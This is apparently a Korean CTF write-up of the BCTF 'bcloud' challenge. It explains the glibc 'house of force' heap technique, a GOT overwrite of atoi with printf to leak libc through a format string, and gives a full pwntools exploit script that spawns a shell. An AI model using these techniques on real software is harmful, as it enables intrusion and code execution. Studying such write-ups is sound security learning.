<h1 id="toc_0">bctf bcloud write-up</h1>

<h2 id="toc_1">Background</h2>

<h3 id="toc_2">house of force</h3>

<p>힙에 공간할당이 요청되었을 때 bin리스트에 free된 적절한 청크가 없다면 top청크 라는 곳의 공간을 떼어내어 할당을 받습니다.</p>

<p><img width="513" alt="2019-01-15 9 32 36" src="https://user-images.githubusercontent.com/45871864/51181057-6f0e7b00-190d-11e9-8ba5-bf1709731211.png"><br>
이런식으로 TOP청크의 공간을 떼어내어 할당받게 됩니다. </p>

<p>top청크는 일반 청크와 같이 size도 가지고 있습니다. 따라서 해당 size만큼 할당을 다 해주게 되면 mmap을 호출하여 새로운 공간에 다시 힙영역을 만들게 됩니다.  </p>

<h3 id="toc_3">[64bit] 기준으로 이야기합니다.(32bit도 똑같은 방식으로 가능합니다.)</h3>

<p>house of force의 아이디어는 바로 이 top청크의 size를 <code>0xffffffffffffffff</code>로 만드는데에 있습니다.<br>
(굳이 <code>0xffffffffffffffff</code>가 아니더라도 원하는 영역까지의 거리보다 크다면 가능합니다)  </p>

<p>가령 현재 top청크의 주소가 <code>0x1006110</code>이라고 해봅시다. 그리고 <code>0x602060</code>이라는 영역에 데이터를 쓰고싶다라고 가정합니다.  </p>

<p>일반적인 방식으로 malloc을 해서는 절대로 저 공간에 할당받을 수 없습니다.<br>
할당을 받을 수록 할당받는 공간의 주소값은 커지기 때문입니다.</p>

<p>현재 힙의 상황이 위의 사진의 두번째 구조와 같고 B청크에서 오버플로우가 나서 TOP청크의 size값을 덮을 수 있어서 <code>0xffffffffffffffff</code>로 덮었다고 가정합니다.  </p>

<p>그리고 <code>0xffffffffff5fbf30</code>만큼 malloc합니다. 그렇게 되면 TOP청크의 주소는 <code>0xffffffffff5fbf30+ 0x1006110</code>가 될 것이고 결국 <code>0x10000000000602040 == 0x602040</code>이 될것입니다. 이 상태에서 malloc을 하게되면 청크 헤더 0x10바이트가 추가된 0x602060에 할당을 받을 수 있게되는 것입니다.</p>

<div><pre><code class="language-none">간단하게 다시 설명하자면 top청크의 size를 0xffffffffffffffff로 덮어 원하는 만큼 할당을 해도  
mmap에 의해 새로 공간요청을 받지 않도록 만든다음 원하는 공간까지 할당을 받는 기법입니다.    </code></pre></div>

<h2 id="toc_4">binary 분석</h2>

<div><pre><code class="language-none">unsigned int input_name()
{
  char s; // [esp+1Ch] [ebp-5Ch]
  char *v2; // [esp+5Ch] [ebp-1Ch]
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

v3 = __readgsdword(0x14u);
memset(&amp;s, 0, 0x50u);
puts(&quot;Input your name:&quot;);                 
get_read((int)&amp;s, 0x40, &#39;\n&#39;);
v2 = (char *)malloc(0x40u);
name_ptr = (int)v2;
strcpy(v2, &amp;s);
welcome((int)v2);
return __readgsdword(0x14u) ^ v3;
}</code></pre></div>

<p><code>get_read((int)&amp;s, 0x40, &#39;\n&#39;);</code>read를 통해 s에 0x40바이트를 적게되면<br>
*v2와 공백없이 붙게됩니다. 이 상태에서 <code>strcpy(v2, &amp;s);</code>가 일어나게 된다면,<br>
v2에는 *v2의 주소까지 같이 적히게 됩니다.<br>
이는 이후에 <code>printf(&quot;Hey %s! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!\n&quot;, a1);</code>를 통해 힙주소를 릭하는데 이용됩니다.  </p>

<div><pre><code class="language-none">unsigned int input_setting()
{
char org; // [esp+1Ch] [ebp-9Ch]
char *org_ptr_; // [esp+5Ch] [ebp-5Ch]
int host; // [esp+60h] [ebp-58h]
char *host_ptr_; // [esp+A4h] [ebp-14h]
unsigned int v5; // [esp+ACh] [ebp-Ch]  

v5 = __readgsdword(0x14u);
memset(&amp;org, 0, 0x90u);
puts(&quot;Org:&quot;);
get_read((int)&amp;org, 0x40, &#39;\n&#39;);
puts(&quot;Host:&quot;);
get_read((int)&amp;host, 0x40, 10);
host_ptr_ = (char *)malloc(0x40u);
org_ptr_ = (char *)malloc(0x40u);
org_ptr = (int)org_ptr_;
host_ptr = (int)host_ptr_;
strcpy(host_ptr_, (const char *)&amp;host);
strcpy(org_ptr_, &amp;org);
puts(&quot;OKay! Enjoy:)&quot;);
return __readgsdword(0x14u) ^ v5;
}</code></pre></div>

<p>다음으로는 ORG와 HOST를 입력하는 창이 나오게됩니다.<br>
메모리의 구조를 보면 이렇습니다.  </p>

<p><img width="1102" alt="2019-01-16 8 44 32" src="https://user-images.githubusercontent.com/45871864/51247162-9fb6e900-19cf-11e9-9948-084e28559838.png"></p>

<p>따라서 <code>strcpy(org_ptr_, (const char *)&amp;org);</code>를 하게될 때 A부터 0xffffffff까지 복사를 하게됩니다. 결국 org청크 아래의 top청크의 size부분을 <code>0xffffffff</code>으로 덮을 수 있는 것입니다.   </p>

<p>이제 newnote메뉴를 통해서 원하는 곳에 어디든 할당받을 수 있고, editnote를 통해 원하는대로 값을 조작할 수 있습니다. 하지만 익스플로잇을 하기위해서는 libc릭이 필요합니다.<br>
하지만 여기서 shownote메뉴가 구현이 되어있지 않고, 방금 welcome에서 이름을 출력할 때 사용했던 printf말고는 릭벡터가 존재하지 않습니다.  </p>

<p>고민끝에 atoi got를 printf로 덮고 printf의 return값이 글자수임을 이용해서 atoi의 기능을 하게 만들었습니다.  </p>

<div><pre><code class="language-none">int get_atoi()
{
char nptr; // [esp+18h] [ebp-20h]
unsigned int v2; // [esp+2Ch] [ebp-Ch]

v2 = __readgsdword(0x14u);
get_read((int)&amp;nptr, 16, 10);
return atoi(&amp;nptr);
}</code></pre></div>

<p>바로 이부분인데요 atoi를 printf로 덮었다고 친다면 이렇게 작동하게 됩니다.</p>

<div><pre><code class="language-none">int get_atoi()
{
char nptr; // [esp+18h] [ebp-20h]
unsigned int v2; // [esp+2Ch] [ebp-Ch]

v2 = __readgsdword(0x14u);
get_read((int)&amp;nptr, 16, 10);
return printf(&amp;nptr);
}</code></pre></div>

<p>앞에서 언급한것 처럼 printf의 return값은 출력한 글자수 입니다. 예를들어 nptr에 &quot;A&quot;를 read로 입력했다 한다면 printf에 의해서 &quot;A&quot;가 출력될 것이고 return 1;이 될것입니다.  </p>

<p>그래서 결국에는 원하는 메뉴를 탐색할 수 있는 기능(즉 atoi의 기능)을 해치지 않고 printf를 이용할 수 있게 되었습니다.  </p>

<p><strong>이런것을 보면 참 atoi라는 함수는 익스플로잇에 많이 쓰이는 것 같네요</strong>  </p>

<p>함수를 호출하고 하다보면 스택에 라이브러리 주소가 남아있곤 합니다.</p>

<div><pre><code class="language-none">[------------------------------------stack-------------------------------------]
0000| 0xffe37370 --&gt; 0xffe37388 (&quot;%x%x %x&quot;)
0004| 0xffe37374 --&gt; 0x10 
0008| 0xffe37378 --&gt; 0xa (&#39;\n&#39;)
0012| 0xffe3737c --&gt; 0xf762a696 (&lt;__printf+38&gt;: add    esp,0x1c)
0016| 0xffe37380 --&gt; 0xf7793d60 --&gt; 0xfbad2887 
0020| 0xffe37384 --&gt; 0x6 
0024| 0xffe37388 (&quot;%x%x %x&quot;)
0028| 0xffe3738c --&gt; 0x782520 (&#39; %x&#39;)
[------------------------------------------------------------------------------]</code></pre></div>

<p>이를 이용해서 방금 atoi를 덮은 printf로 포맷스트링버그를 유발합니다. 위에 스택을 보시면 아시겠지만 인자로 &quot;%x%x %x&quot;를 주었습니다. 그렇게 되면 이와같이 출력됩니다.<br>
<code>10a f75b1696</code> &lt;__printf+38&gt;의 부분이 출력되었는데요, 이를 통해 offset계산을 하여 system의 주소를 구할 수 있습니다.<br>
그런뒤 editnote를 통해 atoi의 got를 system으로 조작해준뒤 nptr에 &quot;/bin/sh&quot;를 주게되면 쉘이 따지는 것을 확인할 수 있었습니다.</p>

<h2 id="toc_5">Exploit Code</h2>

<div><pre><code class="language-none">context.log_level=&#39;debug&#39;
one = 0x3ac5c
atoi_got   = 0x804B03C
printf_plt = 0x80484d0
s = process(&#39;./bcloud&#39;)
def makenote(length,text):
    s.sendline(&#39;1&#39;)
    s.sendline(str(length))
    s.send(text)
def editnote(ID,text):
    s.sendline(&#39;3&#39;)
    s.sendline(ID)
    print &quot;sending : &quot;,text
    s.send(text)
raw_input(&#39;go&#39;)




s.send(&quot;A&quot;*0x40)

s.recvuntil(&#39;Hey &#39;)
tmp = s.recv(0x40)
tmp = u32(s.recv(4))
top = tmp+220
print &quot;atoi got :&quot;,hex(atoi_got)
print &quot;top chunk address : &quot;,hex(top)

s.send(&quot;a&quot;*0x40)
s.sendline(&quot;\xff&quot;*4)
s.recvuntil(&#39;OKay! Enjoy:)&#39;)

howmany = atoi_got-0x8-0x4+0xffffffff+1-top
atoi = howmany-0x100000000
print &quot;malloc(&quot;,hex(howmany),&quot;) real : &quot;,atoi

makenote(atoi,&#39;a\n&#39;)
makenote(8,&quot;AAAA&quot;+p32(printf_plt))
s.sendline(&#39;%x%x %x&#39;)
s.recvuntil(&#39;10a &#39;)
libc = int(&#39;0x&#39;+s.recv(8),16)-300694+one+324
print &quot;system : &quot;,hex(libc)
s.sendline(&#39;123&#39;)
s.sendline(&#39;1&#39;)
s.send(&quot;AAAA&quot;+p32(libc))
s.sendline(&#39;/bin/sh&#39;)

s.interactive()</code></pre></div>
